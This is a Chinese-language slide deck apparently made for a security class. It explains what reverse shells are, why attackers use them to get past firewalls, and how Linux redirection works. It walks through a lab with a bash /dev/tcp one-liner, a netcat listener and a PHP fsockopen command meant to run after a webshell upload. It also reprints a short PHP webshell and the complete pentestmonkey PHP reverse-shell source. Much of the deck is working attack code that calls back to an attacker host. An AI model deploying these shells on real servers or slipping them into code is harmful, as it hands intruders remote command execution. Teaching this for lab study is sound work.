---
marp: true
---
# 反弹shell
---
## 什么是反弹shell  
reverse shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。

---
## 什么是反弹shell  
要清楚什么是反弹shell首先要搞清楚什么是反弹，为什么要进行反弹。假设我们要攻击的了一台机器，打开了该机器的一个端口，攻击者用自己的机器去连接目标主机，（目标ip:端口号）这是一种比较常见的形式。这种形式是叫正向连接，像远程桌面、ssh这样的事都是正向连接的。

---
## 为什么会用到反弹shell
1. 某个客户机中了你给的木马，但是它是在一个局域网内，直接连接是连不了的，它的ip是会动态改变的，不能够持续的控制
2. 由于防火墙的控制，对方的机器只能发送请求不能接受请求
3. 对于木马、病毒、受害者什么时候中招，对方的网络环境是怎么样子的都是未知的，所以使目标服务器发出主动连接请求，从而绕过防火墙的入站访问控制规则。
---
## 基础原理
-  文件描述符以及重定向

linux文件描述符：可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。


```
0 - stdin 代表标准输入 <,<< 输入
1 - stdout 代表标准输出 >,>> 输出
2 - stderr 代表标准错误输出 2>,2>>
```  
---

```
1>fiename # 将标准输出重定向到文件filename
1>>filename #重定向stdout并将其附加到文件 filename
2>filename #将stderr重定向到文件filename。
2>>filename #重定向stderr并将其附加到文件filename

```
eg:
```
LOGFILE=script.log

echo "This statement is sent to the log file, \"$LOGFILE\"." 1>$LOGFILE
echo "This statement is appended to \"$LOGFILE\"." 1>>$LOGFILE
echo "This statement is also appended to \"$LOGFILE\"." 1>>$LOGFILE
echo "This statement is echoed to stdout, and will not appear in \"$LOGFILE\"."
```

---
## 反弹shell实验
- 实验用的机器

客户机：
ip:`192.168.56.102`
`bash -i >& /dev/tcp/192.168.56.101/8888 0>&1`
攻击机：
ip:`192.168.56.101`
`nc -lvp 8888`

---
## 反弹shell实验
`bash -i >& /dev/tcp/192.168.56.101/8888 0>&1`
`>&`  `&>`作用时混合输出（错误正确都回输出到一个地方）
`bash -i > /dev/tcp/192.168.56.101/8888  0>&1 2>&1`
/dev/tcp/是Linux种的一个特殊的设备，打开这个文件就是相当于发出了一个socket调用，建立一个socket链接。
>&:当>&后面接文件时，表示标准输出和标准错误输出重定向至文件
0>&1：下面再该指令后面加上0>&1,代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了/dev/tcp/192.168.56.101/8888这个文件，也就是远程，那么标准输入就重定向了远程


---
## 反弹shell实验  
`nc -lvp 8888`  
nc全称为netcat，所做的就是在两台电脑之间建立链接，并返回两个数据流。
-l 绑定和监听接入连接(server)
-v 显示指令执行过程
-p 设置本地的通信端口

---
## 应用以及遇到的问题
将webshell文件上传，监听端口，访问这个文件，
`php -r '$sock=fsockopen("192.168.56.101",1234);exec("/bin/sh -i <&3 >&3 2>&3");`

---

# python编写数据填充脚本相关问题

---


``` php
<?php

set_time_limit(0);

$ip=$_POST['192.168.56.101'];

$port=$_POST['1234'];

$fp=@fsockopen($ip,$port,$errno,$errstr);

if(!$fp){ echo "error";}

else{

fputs($fp,"\n++++++++++connect success++++++++\n");

while (!feof($fp)) {

fputs($fp,"shell:");//输出

$shell=fgets($fp);

$message=`$shell`;

fputs($fp,$message);

}

fclose($fp);

}

?>
```
---
- uname 主要用于输出一组操作系统的信息
	- -a输出所有的信息
- w 命令用于显示目前登入系统的用户信息。
	- 执行这项指令可得知目前登入系统的用户有哪些人，以及他们正在执行的程序。
	- 单独执行 w 指令会显示所有的用户，您也可指定用户名称，仅显示某位用户的相关信息。

- id 可以显示真实有效的用户ID(UID)和组ID(GID)

- proc_open 执行命令并打开文件指针进行输入/输出

---
```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  Theside are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

```
---

# 参考连接

[Bash : IO 重定向](https://www.cnblogs.com/sparkdev/p/10247187.html)  
[Linux下几种反弹Shell方法的总结与理解](https://www.freebuf.com/articles/system/178150.html)
[自动化反弹Shell防御技术](https://www.freebuf.com/articles/system/187584.html)
[What does “3>&1 1>&2 2>&3” do in a script?](https://unix.stackexchange.com/questions/42728/what-does-31-12-23-do-in-a-script)
[php-reverse-shell.php](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
[自动化反弹Shell防御技术](https://cloud.tencent.com/developer/news/337625)

---